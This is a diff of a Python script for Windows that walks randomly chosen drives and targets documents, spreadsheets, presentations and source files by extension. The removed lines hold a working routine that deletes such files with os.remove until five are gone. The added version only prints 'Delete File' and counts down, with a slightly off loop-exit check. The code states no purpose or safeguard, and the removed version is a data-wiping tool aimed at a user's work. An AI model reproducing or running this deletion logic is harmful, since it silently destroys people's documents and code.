@@ -1,5 +1,6 @@
 import os
 import win32api
+import random
 from random import randint
 
 #------------------------------------------------------
@@ -7,121 +8,33 @@ from random import randint
 #------------------------------------------------------
 drives = win32api.GetLogicalDriveStrings()
 drives = drives.split('\000')[:-1]
-print "all drives:"+str(drives)
-
+filetype = [".m",".py",".c",".cpp",".cs",".doc",".docx",".ppt",".pptx",".xls",".xlsx"]
 
 #------------------------------------------------------
-#   finish flag
+# set delete file number
 #------------------------------------------------------
-finish = 0
-flag = 1
-num = len(drives)
-while(flag and num >=0):
-	#------------------------------------------------------
-	#   select drivers
-	#------------------------------------------------------
-	select = randint(0,len(drives)-1)
-	fileDir =drives[select]
-	print fileDir
-	num=num-1
-	print "rest time:"+str(num)
-	for root, dirs, files in os.walk(fileDir):
+del_num=10
 
+#------------------------------------------------------
+#	start
+#------------------------------------------------------
+while(del_num>0):
+	#------------------------------------------------------
+	#   random choice drive and filetype
+	#------------------------------------------------------
+	sl_drive = random.choice(drives)
+	sl_ft    = random.choice(filetype)
+	print('select drive is   %s  ,select type is   %s  '%(sl_drive,sl_ft))
+	for root, dirs, files in os.walk(sl_drive):
 		for name in files:
-			#----------------------------------------------------------------------
-			#   del program code
-			#----------------------------------------------------------------------
-			#   matlab code
-			#----------------------------------------------------------------------
-			if name.endswith(".m"):
-				os.remove(os.path.join(root, name))
+			if name.endswith(sl_ft):
 				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
+				print del_num
+				del_num=del_num-1
+			#--------------------
+			# out of the loop
+			#--------------------
+			if del_num<0:
 				break
-
-			#----------------------------------------------------------------------
-			#   word file
-			#----------------------------------------------------------------------
-			elif name.endswith(".doc"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-				
-			elif name.endswith(".docx"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-			#----------------------------------------------------------------------
-			#   excel file
-			#----------------------------------------------------------------------
-			elif name.endswith(".xls"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-				
-			elif name.endswith(".xlsx"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-			#----------------------------------------------------------------------
-			#   powerpoint file
-			#----------------------------------------------------------------------
-			elif name.endswith(".ppt"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-			
-			elif name.endswith(".pptx"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-			#----------------------------------------------------------------------
-			#   c file
-			#----------------------------------------------------------------------
-			elif name.endswith(".c"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-				
-			elif name.endswith(".cpp"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-				
-			elif name.endswith(".cs"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-			
-			#----------------------------------------------------------------------
-			#   py file
-			#----------------------------------------------------------------------
-			elif name.endswith(".py"):
-				os.remove(os.path.join(root, name))
-				print ("Delete File: " + os.path.join(root, name))
-				finish = finish + 1
-				print "finish="+str(finish)
-				break
-			
-		if finish>=5:
-			flag=0
+		if del_num<0:
 			break
